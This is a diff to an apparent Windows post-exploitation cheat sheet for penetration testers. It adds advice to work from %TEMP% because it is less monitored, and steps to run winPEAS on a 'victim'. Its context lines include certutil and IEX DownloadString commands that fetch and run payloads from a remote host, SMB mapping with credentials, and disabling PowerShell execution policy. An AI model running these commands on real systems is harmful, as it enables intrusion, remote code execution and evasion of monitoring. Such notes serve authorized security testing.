@@ -1,4 +1,15 @@
-# Local Recon Tools
+# Basics
+
+* Always work from %TEMP% directory as it allows all users to write and it might be less monitored than system folders
+
+```powershell
+PS> cd $env:temp
+```
+
+```cmd
+cmd> cd %TEMP%
+```
+
 
 ## Windows Native programs
 Those programs can be found on every post Win10 machines:
@@ -59,9 +70,8 @@ Powerview is extremely useful to simplify your work with powershell:
 * works with PS 3.0 and higher
 `Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct`
 
-# Download and Upload stuff
+## Download and Upload stuff
 
-## SMB
 
 ```powershell
 
@@ -73,9 +83,6 @@ Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
 
 ```
 
-## PS and cmd
-
-### Download
 
 1. `certutil -urlcache -split -f http://source.ip/payload.exe payload.exe`
 2. Download the file in PS: 
@@ -87,7 +94,6 @@ Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
 or just `IEX(New-Object Net.WebClient).DownloadString('URL')`
 
 
-### smb share
 
 ```
 New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"
@@ -106,7 +112,6 @@ copy c:\test '\\192.168.219.100\share_name'
 net use \\server /user:domain\username password
 ```
 
-## Upload
 
 * Powershell
 ```
@@ -123,7 +128,7 @@ Set-ExecutionPolicy Unrestricted
 
 
 
-# Find Stuff
+## Find Stuff
 
 * cmd: `dir /s /b c:\filename` find filename in c: drive recursively
 * ps: `Get-Childitem –Path C:\ -Include *filetolookfor* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue`
@@ -141,6 +146,22 @@ $rb.Items()
 # Enumeration
 
 ## local enumeration
+
+* Winpeas
+
+Optional: activate this command to see colours in a new command prompt
+
+```cmd
+
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+
+```
+
+Start `winpeas.exe` on victim in Temp folder
+
+
+
+* Older systems
 
 ```
 # For older Systems use Sherlock
